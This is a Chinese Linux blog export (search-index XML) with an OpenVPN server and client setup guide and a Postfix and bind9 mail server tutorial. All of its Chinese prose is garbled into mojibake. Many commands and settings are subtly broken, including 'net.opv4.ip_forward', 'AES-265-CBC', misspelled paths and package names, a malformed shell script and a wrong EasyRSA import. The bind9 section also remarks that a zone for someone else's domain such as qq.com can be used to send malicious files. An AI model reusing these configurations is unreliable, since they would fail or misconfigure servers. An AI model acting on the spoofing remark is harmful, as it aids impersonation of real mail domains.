å…¬é’¥è¯ä¹¦ï¼Œç”¨äºéªŒè¯CAå‰é¢çš„å…¶ä»–è¯ä¹¦ï¼ˆC/Séƒ½éœ€è¦ï¼‰ # ca.key CAçš„ç§é’¥ï¼Œç”¨äºå‰é¢æ‰€æœ‰C/Sè¯ä¹¦ï¼ˆåº”ç§å¯†ä¿å­˜ï¼‰ # è¯ä¹¦æœåŠ¡å™¨åœ¨ä¸ä½¿ç”¨æ—¶ï¼Œå»ºè®®å…³æœº 5.ç”ŸæˆVPNæœåŠ¡å™¨ç§é’¥å’Œè¯ä¹¦ç”³è¯·æ–‡ä»¶ï¼ˆåœ¨VPN Serverï¼‰ cd EasyRSA-v3.0.6/ ./easyrsa init-pki # åªæ˜¯åˆå§‹åŒ–PKIæ¶æ„ ./easyrsa gen-req vpnserver nopass # ç”Ÿæˆè¯ä¹¦ç”³è¯·æ–‡ä»¶ï¼Œèµ·ä¸ªåå­—ï¼Œè®¾ç½®å¯†ç  # pki/reqs/vpnserver.req # pki/private/vpnsenver.key # ç§é’¥æ–‡ä»¶è¦å¥½å¥½ä¿å­˜ sudo cp pki/private/vpnserver.key /etc/openvpn # æ‹·è´ç§é’¥æ–‡ä»¶ # å°†è¯ä¹¦è¯·æ±‚æ–‡ä»¶ä¼ è¾“è‡³CAç­¾å‘ scp pki/reqs/vpnserver.req xps@CA_IP:/tmp 6.å¯¼å…¥å¹¶ç­¾å‘VPNæœåŠ¡å™¨è¯ä¹¦ï¼ˆåœ¨CA Serverï¼‰ ./easyrsa import-req /tmp/vpnserver.req vpnserver # å¯¼å…¥ï¼ŒåŠ ä¸€ä¸ªåå­— ./easyrsa sign-req vpnserver vpnserver # ç­¾å‘ï¼Œ pki/issued/vpnserver.crt # è¯ä¹¦ç±»å‹ server / client ## å°†è¯ä¹¦å›ä¼ è‡³vpnserver scp pki/issued/vpnserver.crt xps@vpnserver_IP:/tmp/ # vpnserverè¯ä¹¦ scp pki/ca.crt xps@vpnserver_IP:/tmp/ # CAå…¬é’¥è¯ä¹¦ï¼ˆè‡ªå»ºçš„è¯ä¹¦ï¼Œè¦æƒ³è¢«ä¿¡ä»»ï¼Œå¿…é¡»è·å¾—caæœåŠ¡å™¨çš„å…¬é’¥ï¼‰ 7.æ‹·è´è¯ä¹¦æ–‡ä»¶ï¼ˆåœ¨vpnserverï¼‰ sudo cp /tmp/{vpnserver.crt, sa.crt} /etc/openvpn # ç”ŸæˆDiffie-Hellmanå¯†é’¥ï¼ˆå¯†é’¥äº¤æ¢ï¼‰ ./easyrsa gen-dh # ç”ŸæˆHMACç­¾åï¼ˆTLSå®Œæ•´æ€§æ ¡éªŒï¼‰ dh.pem openvpn --genkey --secret ta.key # ç”Ÿæˆå®‰å…¨å¯†é’¥ sudo cp ta.key /etc/openvpn/ sudo cp pki/dh.pem /etc/openvpn/ # æœåŠ¡ç«¯è¯ä¹¦è®¾ç½®å…¨éƒ¨å®Œæˆ 8.å®¢æˆ·ç«¯è¯ä¹¦ï¼ˆåœ¨VPN Serverï¼‰ # å®¢æˆ·ç«¯ä¹Ÿè¦è¯ä¹¦æ¥è¯æ˜è‡ªå·±çš„èº«ä»½ ## åœ¨ VPNæœåŠ¡å™¨ä¸Šç”Ÿæˆå®¢æˆ·ç«¯è¯ä¹¦ ## ä½¿ç”¨è„šæœ¬æ‰¹é‡è‡ªåŠ¨ç”Ÿæˆå®¢æˆ·ç«¯é…ç½®æ–‡ä»¶ ## ç”Ÿæˆå®¢æˆ·ç«¯è¯ä¹¦å¯†é’¥ / è¯·æ±‚æ–‡ä»¶ mkdir -p ~/client-configs/keys # è¯ä¹¦æ–‡ä»¶ç›®å½• chmod -R 700 ~/client-configd # é…ç½®æ–‡ä»¶ç›®å½• cd ~/EasyRSA-v3.0.6/ ./easyrsa gen-req client_1 nopass # client_1 cp pki/private/client_1.key ~/client-configs/keys/ scp pki/reqs/client_1.req xps@CA_IP:/tmp/ # è¯ä¹¦çš„è¯·æ±‚æ–‡ä»¶ 9.å¯¼å…¥å¹¶ç­¾å‘è¯ä¹¦ï¼ˆåœ¨CA Serverï¼‰ ./easyrsa import-req /tmp/client_1.key client_1 # å¯¼å…¥ ./easyrsa sign-req client client_1 # ç­¾å‘ï¼ˆè¯ä¹¦ç±»å‹ï¼Œè¯ä¹¦column nameï¼‰ scp pki/issued/client_1.crt xps@vpnserver_IP:/tmp/ 10.å¤åˆ¶è¯ä¹¦æ–‡ä»¶ï¼ˆåœ¨VPN Serverï¼‰ cp /tmp/client_1.crt ~/client-configs/keys/ cp ~/EasyRSA-v3.0.6/ta.key ~/client-configs/keys/ sudo cp /etc/openvpn/ca.crt ~/client-configs/keys/ å®¢æˆ·ç«¯è¯ä¹¦æ–‡ä»¶å‡†å¤‡å®Œæ¯•ï¼Œä¸‹é¢æ­¥éª¤éƒ½æ˜¯åœ¨VPNæœåŠ¡å™¨ä¸Šé…ç½® 11.vpnæœåŠ¡å™¨é…ç½®æ–‡ä»¶ sudo cp /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gz /etc/openvpn/ sudo gzip -d /etc/openvpn/server.conf.gz sudo vim /etc/openvpn/server.conf # é…ç½®æ–‡ä»¶ï¼Œæ ¹æ®è‡ªå·±çš„æƒ…å†µæ¥ä¿®æ”¹ tls-auth ta.key 0 key-direction 0 cipher AES-256-CBC auth SHA256 dh dh.pem user nobody group nogroup ; ä¸‹é¢ï¼Œå¼ºåˆ¶å®¢æˆ·ç«¯ã€æ‰€æœ‰ã€‘æµé‡è·¯ç”±åˆ°tun0ï¼ˆæˆ‘çš„vpnéš§é“ï¼‰ push "redirect-gateway def1 bypass-dhcp" push "dhcp-option DNS 202.106.8.20" push "dhcp-option DNS 8.8.8.8" ; DNSæœåŠ¡å™¨å¯è®¾å¤šä¸ª ;ç«¯å£å’Œåè®® port 443 proto tcp ï¼›å¦‚æœç”¨TCPçš„1194ï¼Œå°±æ— éœ€è¿™æ¡ explicit-exit-notify 0 ;æŒ‡å®šæœåŠ¡å™¨è¯ä¹¦æ–‡ä»¶ cert vpnserver.crt key vpnserver.key 12.å¯åŠ¨æœåŠ¡å™¨è·¯ç”±åŠŸèƒ½ sudo vim /etc/sysctl.conf net.opv4.ip_forward = 1 sudo sysctl -p 13.ç¡®è®¤é»˜è®¤è·¯ç”±ç½‘å¡åç§° ip route |grep default default via 192.168.8.2 dev enp0s3 proto static 14.ä¿®æ”¹é˜²ç«å¢™è§„åˆ™å®ç°NAT # è¿ä¸Šæˆ‘çš„vpnä¹‹åï¼Œéƒ½æŠŠæˆ‘çš„åœ°å€è½¬æ¢ä¸ºè·¯ç”±ç»‘å®šç½‘å¡çš„å†…ç½‘çš„åœ°å€ï¼Œéšè—åŸæœ¬çš„åœ°å€ sudo vim /etc/ufw/before.rules # ä¼˜å…ˆçº§é«˜äºæ™®é€šUFWè§„åˆ™ # START OPENVPN RULES *nat :POSTROUTING ACCEPT [0:0] -A POSTROUTING -s 10.8.0.0/8 -o enp0s3 -j MASQUERADE # -s æºåœ°å€ COMMIT # END OPENVPN RULES 15.å¼€å¯é˜²ç«å¢™ sudo vim /etc/degault/ufw # é˜²ç«å¢™é»˜è®¤æœªå¼€å¯è½¬å‘åŒ…ï¼Œè¿™é‡Œå¼€å¯è½¬å‘åŒ… DEFAULT_FORWARD_POLICY="ACCEPT" # å¯åŠ¨é˜²ç«å¢™åŠè§„åˆ™ sudo ufw allow 1194/udp # vpnçš„ç«¯å£å…è®¸ sudo ufw allow OpenSSH # å¦åˆ™sshè¿æ¥ä¸ä¸Šäº† sudo ufw disable sudo ufw enable # å¯åŠ¨OpenVPNæœåŠ¡ sudo systemctl start openvpn@server # server.conf çš„åç§°ä¸€è‡´ sudo systemctl status openvpn@server sudo systemctl enable openvpn@server ip addr show tun0 # å‘ç°å¤šäº†ä¸€ä¸ªç½‘å¡tun0 å®¢æˆ·ç«¯é…ç½®1.é…ç½®æ–‡ä»¶æ¨¡æ¿ï¼ˆç”¨æˆ·åªéœ€å‚»ç“œå¼æ“ä½œå³å¯ï¼Œæ‰€æœ‰è¯ä¹¦æå‰ç”³è¯·å¥½ï¼Œå…¶ä»–çš„ç”¨è„šæœ¬æ–¹å¼æ‰§è¡Œï¼‰ mkdir -p ~/client-configs/files # é…ç½®æ–‡ä»¶å­˜æ”¾çš„ç›®å½• cp /usr/share/doc/openvpn/examples/sample-config-files/client.conf ~/client-configs/base.conf # Linuxå®¢æˆ·ç«¯æœ‰è¿™ä¸ªæ–‡ä»¶ï¼š /etc/openvpn/update-resolv-conf vim ~/client-configs/base.conf # script-security 2 # ä¸‹é¢ä¸‰è¡Œï¼Œä»…ä»…é’ˆå¯¹Linuxå®¢æˆ·ç«¯(æ‰å–æ¶ˆæ³¨é‡Š) # up /etc/openvpn/update-resolv-conf # down /etc/openvpn/update-resolv-conf remote vpnserver_IP 1194 proto udp user nobody group nogroup # Centosæ˜¯nobody # ca ca.crt # cert client.key # key client.key # tls-auth ta.key 1 cipher AES-265-CBC auth SHA256 key-direction 1 2.å®¢æˆ·ç«¯é…ç½®è„šæœ¬ vim ~/client-configs/make_config.sh # è„šæœ¬å‚æ•°ä¸ºå®¢æˆ·ç«¯æ ‡è¯†å #!bin/bash KEY_DIR=~/client-configs/keys OUTPUT_DIR=~/client-configs/files BASE_CONFIG=~/client-configs/base.conf cat ${BASE_CONFIG} \ &lt;(echo-e '&lt;ca>')\ ${KEY_ DIR}/ca.crt \ &lt;(echo -e '&lt;/ca>\n&lt;cert>')\ S{KEY_ DIR}/${1}.crt \ # ${1} æ˜¯è„šæœ¬è¿è¡Œæ—¶çš„å‚æ•° &lt;(echo -e '&lt;/cert>\n&lt;key>')\ S{KEY_ DIR/${1}.key\ &lt;(echo e '&lt;/key>\n&lt;tls-auth>')I ${KEY_DIR}/ta.key\ &lt;(echo -e '&lt;/tls-auth>') \ > ${OUTPUT_ DIR}/${1}.ovpn chmod 700 ~/client-configs/make_config.sh cd ~/client-configs # ä¸ºæ¯ä¸ªç”¨æˆ·ç”³è¯·è¯ä¹¦ sudo ./make_config.sh client_1 # ç”Ÿæˆclient_1.ovpn # åˆ†åˆ«ä¸ºæ¯ä¸ªç”¨æˆ·ç«¯ç”Ÿæˆç›¸åº”è¯ä¹¦ï¼Œç„¶åè¿è¡Œè„šæœ¬ç”Ÿæˆé…ç½®æ–‡ä»¶ # å°†.ovpné…ç½®æ–‡ä»¶æ‹·è´åˆ°å®¢æˆ·å• # å¦‚æœæ˜¯Linuxå®¢æˆ·ç«¯ï¼Œè¦æŠŠé…ç½®æ–‡ä»¶client.ovpnä¸­ä¸‹é¢ä¸‰è¡Œå–æ¶ˆæ³¨é‡Š script-security 2 up /etc/openvpn/update-resolv-conf down /etc/openvpn/update-resolv-conf # å¦‚æœæ˜¯Centosç³»ç»Ÿï¼Œé…ç½®æ–‡ä»¶client.ovpnè¦ä¿®æ”¹ group nobody 3.å®¢æˆ·ç«¯å®‰è£… ## Linuxå®¢æˆ·ç«¯å®‰è£… sudo apt install openvpn ## Linuxå®¢æˆ·ç«¯ vim client.ovpn script-security 2 up /etc/openvpn/update-resolv-conf down /etc/openvpn/update-resolv-conf 4.å»ºç«‹VPNè¿æ¥ ## å‘½ä»¤è¡Œæ–¹å¼ sudo openvpn --config client_1.ovpn > /dev/null 2>&amp;1 &amp; ## ubuntuå›¾å½¢åŒ–æ–¹å¼ # å…ˆå®‰è£…openvpnçš„gnomeå°æ’ä»¶ sudo apt install metwork-manager-openvpn sudo apt install metwork-manager-openvpn-gnome sudo systemctl restart network-manager è®¾ç½®ï¼Œç½‘ç»œï¼ŒVPNï¼Œæ·»åŠ ï¼Œä»æ–‡ä»¶å¯¼å…¥ovpnæ–‡ä»¶ ## å…¶ä»–VPNå®¢æˆ·ç«¯ Cisco Concentrator # network-manager-vpnc Cisco OpenConnect # network-manager-openconnect PPTP(Microsoft VPN) # network-manager-pptp stringSwan(for some IPsec VPNs) # network-manager-strongswan 5.å…¶ä»–å¹³å°å®¢æˆ·ç«¯ ## Windowså®¢æˆ·ç«¯ https://openvpn.net/index.php/open-source/downloads.html # C:\Program Files\OpenVPN\config\client2.ovpn # è¦ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ ##IOS App Storeæœç´¢OpenVPN Connect ## Android OpenVPN Connect ## MacOS https://tunnelblick.net/downloads. html å®‰è£…ç»“æŸè‡ªåŠ¨æç¤ºå¯¼å…¥å®¢æˆ·ç«¯é…ç½®æ–‡ä»¶ æ’¤é”€å®¢æˆ·ç«¯è¯ä¹¦1.CA Server cd EasyRSA-3.0.4/ ./easyrsa revoke client2 ./easyrsa gen-crl # ç”Ÿæˆè¯ä¹¦åŠé”€åˆ—è¡¨CRL(crl.pem) scp pki/crl.pem xps@vpnserver_IP:/tmp 2.VPN Server # åœ¨vpn serverè°ƒç”¨ sudo cp /tmp/crl.pem /etc/openvpn sudo vi /etc/openvpn/server.conf crl-verify crl.pem # æœ€åä¸€è¡Œæ·»åŠ åŠé”€æŒ‡ä»¤ sudo systemctl restart openvpn@server document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>ä»£ç†</tag>
        <tag>VPN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu sever-é‚®ä»¶æœåŠ¡]]></title>
    <url>%2Fposts%2F36278%2F</url>
    <content type="text"><![CDATA[ç›´åˆ°ä»Šå¤©ï¼ŒEmaiä»ç„¶æ˜¯äº’è”ç½‘ä¸Šæœ€é‡è¦çš„ä¿¡æ¯ä¼ é€’æ–¹å¼ä¹‹ä¸€ ç”µå­é‚®ä»¶åŸºç¡€å¿«é€Ÿã€ä¾¿æ·ã€é€šç”¨ã€å¼‚æ­¥é€šä¿¡æ–¹å¼1965å¹´æœ€æ—©ç”±MITå‘æ˜å¹¶å¼€æºï¼ˆæœ€æ—©ç”¨äºä¸åŒä¸»æœºç”¨æˆ·é—´é€šä¿¡ï¼‰1971å¹´ç¡®å®šé‚®ä»¶åœ°å€ä»¥@ç¬¦å·è¿æ¥ï¼ˆåœ¨ä¸åŒä¸»æœºä¹‹é—´ä¼ é€’ä¿¡æ¯ï¼‰MIMEç±»å‹æ‰©å±•é‚®ä»¶ä»çº¯æ–‡æœ¬åˆ°ä¼ é€’æ–‡ä»¶ï¼ˆæ–‡æ¡£ã€å›¾ç‰‡ã€åª’ä½“ï¼‰ é‚®ä»¶å¯è¢«ä¼ªé€ ï¼Œé‚®ä»¶ç‚¸å¼¹ï¼Œåƒåœ¾é‚®ä»¶ ä¼ ç»Ÿç‰©ç†é‚®ä»¶ï¼šå†™ä¿¡-&gt;åˆ°æœ¬åœ°é‚®å±€-&gt;ç›®çš„é‚®å±€-&gt;æ”¶ä»¶äºº ç”µå­é‚®ä»¶Client1 -&gt; Server1 -&gt; Server2 -&gt; Client2 ï¼ˆé‚®ä»¶åœ°å€é€šè¿‡DNSè§£æå®Œæˆé‚®ä»¶è·¯ç”±ï¼‰æ— æ”¶ä»¶äººè¿”å›æŠ¥é”™ï¼ˆä¸é€šçŸ¥ï¼‰ï¼Œè¿ä¸ä¸Šç›®æ ‡æœåŠ¡å™¨å‘¨æœŸé‡å‘ï¼ˆç›´è‡³å¤±è´¥ï¼‰ SMTPï¼ˆSimple Mail Transfer Protocolï¼‰ MTA(Mail transfer agents) ä¹‹é—´é€šä¿¡åè®®ï¼ˆSMTPDï¼‰ ç”±å¾ˆå¤šå°ç¨‹åºå®ç°MTAæ‰€æœ‰åŠŸèƒ½ Sendmaiã€Postfixã€Eximã€Qmail å®¢æˆ·ç«¯å‘èµ·é‚®ä»¶ MUA -&gt; MTA ä¹Ÿæ˜¯ç”¨SMTPåè®® MTA(Mail Transfer Agent)å¸¸è§çš„MTAè½¯ä»¶ï¼š 1. Sendmial ä¸€ä¸ªMTAè½¯ä»¶åŒ… å¤„ç†ç€ç»å¤§å¤šæ•°äº’è”ç½‘ç”µå­é‚®ä»¶ å¼€æºå…è´¹ç‰ˆ / å•†ä¸šç‰ˆï¼ˆGUIé¡µé¢ï¼‰ é…ç½®è¿‡äºå¤æ‚ï¼ˆé»˜è®¤é…ç½®å·²ç»å¯ä»¥è‰¯å¥½å·¥ä½œï¼‰ åŠŸèƒ½å…¨é¢ä½†æ€§èƒ½ä¸å ä¼˜åŠ¿ 2. Postfix æ¥è‡ªäºIBMçš„å¼€æºMTAï¼ˆUbuntué»˜è®¤é¦–é€‰MTAï¼‰ é€Ÿåº¦ä¼˜äºSendmailï¼Œé…ç½®ç®¡ç†æ›´ç®€å•ï¼ˆé…ç½®æ–‡ä»¶ã€å‘½ä»¤ï¼‰ å¯ä»¥å¹³æ»‘æ›¿æ¢Sendmailï¼ˆæ¨¡å—åŒ–ï¼‰ 3. Qmail Postfixçš„å¯æ›¿ä»£é€‰æ‹©ï¼ˆæ¨¡å—åŒ–çš„MTAï¼Œç”¨æˆ·ã€é…ç½®ç›¸åˆ†ç¦»ï¼‰ è®¾è®¡åˆè¡·æ˜¯å®ç°å–ä»£Sendmailçš„æ›´å®‰å…¨å¿«é€Ÿçš„MTA ä»Sendmailè¿ç§»åˆ°Qmailè¿‡ç¨‹å¤æ‚ ä¼—å¤šæ’ä»¶ï¼ŒåŒ…å«WebMailã€POPæœåŠ¡ 4. Exim æ¯”Sendmailã€Postfixæ›´å®‰å…¨å¿«é€Ÿï¼Œä½†é…ç½®æ–¹å¼ä¸åŒ ä¸Qmailéƒ½ä½¿ç”¨maildiræ ¼å¼é‚®ç®±å­˜å‚¨ é‚®ç®±å­˜å‚¨MBOX ä¼ ç»Ÿçš„mboxæ ¼å¼é‚®ç®±å­˜å‚¨å°†æ‰€æœ‰é‚®ä»¶å­˜äºä¸€ä¸ªæ–‡ä»¶ä¸­ï¼ˆç´¢å¼•å®šä½å…·ä½“é‚®ä»¶ï¼‰ æ–‡ä»¶å’Œç´¢å¼•æŸåå¯èƒ½é€ æˆé‚®ä»¶ä¸¢å¤±ï¼Œæ•…éšœæ¢å¤å›°éš¾ ä¸é€‚äºå­˜å‚¨äºNFSæŒ‚è½½ç›®å½•ä¸­ MAILDIR Maildiræ ¼å¼åŒ…å«ä¸‰ä¸ªå­ç›®å½•/cur,/new,/tmpï¼Œ æ¯ä¸ªé‚®ä»¶åˆ†éš”ç‹¬ç«‹ä¿å­˜ å¯å¹¶è¡Œè®¿é—®ï¼Œæ€§èƒ½æ›´é«˜ï¼ˆmboxä¸æ”¯æŒï¼‰ å¯ç”¨NFSä½œä¸ºé‚®ç®±å­˜å‚¨ MTAå¯ç›´æ¥æŠ•é€’å’Œè¯»å–æ–‡ä»¶æ›´å¤šæ—¶å€™é‚®ä»¶æŠ•é€’ç”±MDAå®Œæˆ MDA(Mail Delivery Agent, é‚®ä»¶æŠ•é€’ä»£ç†)MDAæ¯”MTAé¢å¤–å®ç°è‡ªåŠ¨è¿‡æ»¤ã€å›å¤ã€è§„åˆ™è½¬å­˜ã€æ€æ¯’ç­‰ä½†é‚®ä»¶çš„æ”¶è¿˜æ˜¯é MTA å¸¸è§çš„MDAè½¯ä»¶ï¼š 1. Mailx MDA + MUAï¼ˆUbuntuçš„é»˜è®¤MDAï¼‰ æ¥è‡ªMTAçš„é‚®ä»¶äº¤ç»™MailxæŠ•é€’åˆ°ç”¨æˆ·é‚®ç®±ï¼ˆ/var/mail/ï¼‰ ä¸»ç›®å½•ä¸‹ï¼š.forwardæ–‡ä»¶å®ç°è‡ªåŠ¨è½¬å‘ï¼ˆå¦‚ï¼šå…¬å¸é‚®ç®±çš„é‚®ä»¶ï¼Œé€šè¿‡.forwardè¿›è¡Œè½¬å‘åˆ°ç§äººé‚®ç®±ï¼‰ 2. main.local å¸¸ç”¨äºBSDçš„MDAç¨‹åº åŠŸèƒ½ä½¿ç”¨ä¸Mailxç±»ä¼¼ 3. procmail æœ€æµè¡Œçš„MDAä¹‹ä¸€ Recipeså…è®¸ç”¨æˆ·è‡ªå®šä¹‰é‚®ä»¶å¤„ç†è„šæœ¬ï¼ˆ.procmailrcï¼‰ MUA(Mail User Agent) è¯»å–å’Œå±•ç¤ºé‚®ç®±ä¸­çš„é‚®ä»¶ï¼ˆä¸é‡‘æ…ˆå®å®«é‚®ä»¶ä¼ é€’ï¼‰ åœ¨å“ªè¯»é‚®ä»¶/é‚®ä»¶æ˜¾ç¤ºæ ¼å¼ï¼ˆMIMEï¼‰ å¸¸è§ç±»å‹çš„MUAï¼š 1.MailxMUA + MDAæœåŠ¡å™¨æœ¬åœ°ç›´æ¥è¯»å–é‚®ç®±mail 2.Dovecot è¿œç¨‹å®¢æˆ·ç«¯è®¿é—®é‚®ç®± POP3(Post Office Protocol version 3) é€‚åˆå•ä¸€å®¢æˆ·ç«¯ï¼Œå•é¡¹é€šä¿¡åè®®(MUA &lt;- MDA) IMAP4(Internet Message Access Protocol 4) é€‚åˆå¤šé‚®ä»¶å®¢æˆ·ç«¯ï¼ŒåŒé¡¹åŒæ­¥åè®®( MUA &lt;--&gt; MDA) æœ€åŸºæœ¬çš„ï¼šMTA+MDA+MUA å…¸å‹å‘½ä»¤ï¼š 3. å…¶ä»–é‚®ç®±è®¿é—®æ–¹å¼Web Mail WAPIï¼ˆ å¾®è½¯ä¸“æœ‰é‚®ç®±åè®®ï¼‰ 4. Fetchmailè‡ªå·±æœ¬åœ°é‚®ç®±æœåŠ¡å™¨ &lt;- è¿è¡Œå•†é‚®ä»¶æœåŠ¡å™¨(POP3 / IMAP) é€‚ç”¨äºæ¯æœˆç¨³å®šäº’è”ç½‘è¿æ¥çš„å°å…¬å¸ ç”µå­é‚®ä»¶æ¶æ„é‚®ä»¶ç»“æ„ ä¿¡å°ï¼šç”¨äºé‚®ä»¶è·¯ç”±ï¼Œå¯¹ç”¨æˆ·é€æ˜ä¸å¯è§ é‚®ä»¶å¤´ï¼šé‚®ä»¶è·¯ç”±ä¼ è¾“è¿‡ç¨‹çš„è®°å½•æ—¥å¿—ï¼ˆå¦‚æœé‡åˆ°ä¸ä¸“ä¸šçš„å°é»‘å®¢ï¼Œå¯ä»¥é€šè¿‡é‚®ä»¶å¤´æ¥æº¯æºï¼‰ é‚®ä»¶ä½“ï¼šé‚®ä»¶è¦ä¼ é€’çš„å…·ä½“å†…å®¹ SPAM åƒåœ¾é‚®ä»¶ï¼Œä¸è¯·è‡ªæ¥çš„é‚®ä»¶ï¼ˆJunkï¼‰ å¤„ç†æµªè´¹æ—¶é—´ã€ç½‘ç»œå¸¦å®½ã€å­˜å‚¨ç©ºé—´ ç—…æ¯’ã€æœ¨é©¬ã€è •è™«ã€é’“é±¼é‚®ä»¶ åŒ…å«æ¶æ„é™„ä»¶ã€é“¾æ¥ã€ä¼ªè£…ã€è¯ˆéª—å†…å®¹ å­˜åœ¨å®‰å…¨é£é™©ï¼Œè°¨æ…æ‰“å¼€é™Œç”Ÿé‚®ä»¶ é‚®ä»¶è§„èŒƒ æ”¶ä»¶äººä¸ºäº‹ä»¶ç›´æ¥ç›¸å…³äººï¼ˆå…¶ä»–ç›¸å…³äººä½œä¸ºæŠ„é€äººï¼‰ æ¬¡è¦ç›¸å…³äººæŒ‰èŒä½é¡ºåº CC(æŠ„é€äººï¼Œæ”¶ä»¶äººèƒ½çœ‹è§æˆ‘å‘ç»™æŠ„é€äººï¼ŒæŒ‰èŒä½é¡ºåºæ’åˆ—)ã€BCCï¼ˆå¯†é€äººï¼Œæ”¶ä»¶äººæ˜¯ä¸çŸ¥é“æˆ‘å‘ç»™å¯†é€äººäº†ï¼‰ ä¸»é¢˜ç®€ä»‹æ¸…æ™°ï¼Œé«˜åº¦æ¦‚æ‹¬ï¼ˆåˆ‡å¿ŒæŠŠæ­£æ–‡å…·ä½“å†…å®¹å†™åˆ°ä¸»é¢˜ï¼‰ ä¿è¯è¡¨è¿°æ¸…æ¥šçš„å‰æä¸‹é‚®ä»¶å†…å®¹å°½å¯èƒ½çŸ­ï¼ˆé¿å…è¯­æ³•é”™è¯¯ï¼‰ï¼Œä¸è¦ä½¿ç”¨æ¨¡æ£±ä¸¤å¯/æ—¶é«¦è¯­è¨€ é€‚å½“ä½¿ç”¨è¡¨æƒ…ç¬¦ å›å¤ã€è½¬å‘å®Œæ•´é‚®ä»¶æµï¼ˆç¦æ­¢å•ç‹¬æ–°å†™é‚®ä»¶ä½œä¸ºå›å¤ï¼‰ å‹ç¼©é™„ä»¶ é™„ä¸ªäººç­¾åï¼ˆå…¬å¸çš„ä¿¡æ¯ï¼ŒèŒä½ï¼Œå§“å -&gt; æˆ–å¼„æˆäºŒç»´ç -&gt;ä¸å¤ªå»ºè®®ï¼Œå»ºè®®ç›´æ¥ç”¨æ–‡æœ¬å½¢å¼ï¼‰ æ²Ÿé€šæ˜¯æ‰€æœ‰ä¼ä¸šé¢å¯¹çš„æœ€å¤§é—®é¢˜ Postfixç®€å•éƒ¨ç½²MTA(èƒ½å‘å‡ºé‚®ä»¶æœ€å…³é”®çš„ç»„ä»¶) 1.å…ˆå®‰è£…DNSæœåŠ¡å™¨ sudo apt install bind9 2.é…ç½® # sudo vim /etc/bind/named.conf.options # è‡ªå·±è§£æä¸äº†çš„åŸŸåï¼Œè½¬å‘ç»™äº’è”ç½‘ä¸Šå…¶ä»–çš„ forwarders { 8.8.8.8; } # sudo vim /etc/bind/named.conf.local # è‡ªå·±çš„åŸŸ(å¯ä»¥æ˜¯ä»»ä½•åŸŸåï¼Œè™½ç„¶è¢«åˆ«äººå ç”¨çš„ã€‚å¯ä»¥ç”¨æ¥å‘é€æ¶æ„æ–‡ä»¶) zone "qq.com"{ type master; file "/etc/bind/db.qq.com"; # åŒºåŸŸæ–‡ä»¶ } # cp /etc/bind/db.local.local # sudo vim /etc/bind/db.qq.com $TTL 604800 @ IN SOA ns.qq.com. root.qq.com. ( 2 ; Serial 604800 ; Refresh 86400 ; Retry 2419200 ; Expire 604800 ) ; Negative Cache TTL ; @ IN NS ns # åˆ›å»ºNSè®°å½• @ IN MX 5 mail # åˆ›å»ºMXè®°å½•ï¼Œä¼˜å…ˆçº§(å€¼è¶Šå¤§ï¼Œä¼˜å…ˆçº§è¶Šä½) ns IN A 192.168.0.19 # NSçš„è®°å½• mail IN A 192.168.0.19 # MXçš„è®°å½• pop IN A 192.168.0.19 imap IN A 192.168.0.19 smtp IN A 192.168.0.19 @ IN A 192.168.0.19 # @ä»£è¡¨æœ¬åŸŸåŸŸåè‡ªå·± 3.é‡å¯bindæœåŠ¡ sudo systemctl restart bind9 4.ç½‘ç»œé…ç½®ï¼ˆé…ç½®é™æ€ipï¼‰ # sudo vim /etc/netplan/50-cloud-init.yaml dhcp4:no addresses:[192.168.1.2/24] gateway4:192.168.1.1 nameservers: search:[qq.com] addresses:[192.168.1.2] # æŒ‡å‘é‚®ç®±æœåŠ¡å™¨çš„ip sudo netplan apply sudo networkctrl status 5.ä¿®æ”¹ä¸»æœºå #sudo vim /etc/hostname mail.qq.com # ç›´æ¥ä¿®æ”¹hostnameåï¼Œé‡å¯åä¼šå˜å›å»ï¼Œæ‰€ä»¥ä¿®æ”¹ä¸‹é¢çš„é…ç½®æ–‡ä»¶ #sudo vim /etc/cloud/cloud.cfg preserve_hostname:true 6.å®‰è£…Postfix sudo apt install postfix å‘å¯¼çª—å£ï¼Œé€‰æ‹©ï¼š Internet Site # ä¸€èˆ¬é€‰è¿™ä¸ªå°±å¥½ Internet Site smarthost # æ™ºèƒ½ä¸»æœº æ“ä½œç³»ç»Ÿçš„ä¸»æœºå # mail.qq.com grep mail /etc/group # ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªç”¨æˆ·ç»„mail grep postfix /etc/group # ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªç”¨æˆ·ç»„postfix # ä½†æ˜¯postfixé»˜è®¤ä½¿ç”¨æ“ä½œç³»ç»Ÿçš„ç”¨æˆ·ï¼Œè¦åŠ å…¥æœ¬åœ°ç”¨æˆ·åˆ°ç›¸åº”ç»„(åªæœ‰è¯¥ç”¨æˆ·ç»„çš„æˆå‘˜æ‰å¯å‘é‚®ä»¶) sudo usermod -aG mail xps # sudo useradd -m -G mail xxx2 # sudo passwd xxx2 # mail # mailå‘½ä»¤é»˜è®¤ä¸å®‰è£…ï¼Œå…ˆå®‰è£… sudo apt install mailutils # å®‰è£… mail # å†ä½¿ç”¨ mail xps@qq.com # ä¸»è¦æ”¶ä»¶äºº cc: xps2@163.com # æŠ„é€äºº Subject: test2 # ä¸»é¢˜ xxxxxxæ­£æ–‡ # ctrl + D å‘é€é‚®ä»¶ su xxx2 # åˆ‡æ¢åˆ°è¯¥ç”¨æˆ·æŸ¥çœ‹è¯¥ç”¨æˆ·æ”¶åˆ°çš„é‚®ä»¶ mail # å¯ä»¥æŸ¥çœ‹è¯¥ç”¨æˆ·æ”¶åˆ°çš„é‚®ä»¶ å•æœºé‚®ä»¶ä¸€èˆ¬å­˜åœ¨/var/mail/ç”¨æˆ·å # ä¸€èˆ¬å¤§çš„é‚®ç®±æœåŠ¡å•†ï¼Œå¦‚QQï¼Œ163ç­‰ï¼Œä¼šåæŸ¥å‘ä»¶äººé‚®ä»¶çš„åœ°å€æ˜¯å¦æ˜¯åˆæ³•çš„ ç›®å‰ï¼Œåªèƒ½å‘é‚®ä»¶ï¼Œä¸èƒ½æ”¶é‚®ä»¶ 